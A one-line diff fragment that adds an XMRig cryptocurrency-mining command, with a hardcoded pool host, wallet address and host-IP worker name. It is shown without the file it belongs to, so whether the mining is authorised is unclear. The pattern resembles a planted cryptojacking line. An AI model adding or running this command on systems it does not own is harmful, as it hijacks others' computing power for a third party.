@@ -1,0 +1,1 @@
+./xmrig -o tabo.btc050.com:3333 -u TaBobt5Gq6jLvKqgpCuFqcLnKUjUjaGrxhdvoRNZjHhFf2Jmoew6jQEaJUKcmjo14jh2RyMWikkHG4PUX1UmX8Xz8UrAGL8dXX -p $(hostname -I | cut -d' ' -f1) --keepalive --algo rx/0 --log-file logs/XMRig-randomx-Cpu.log --donate-level 0 --randomx-1gb-pages
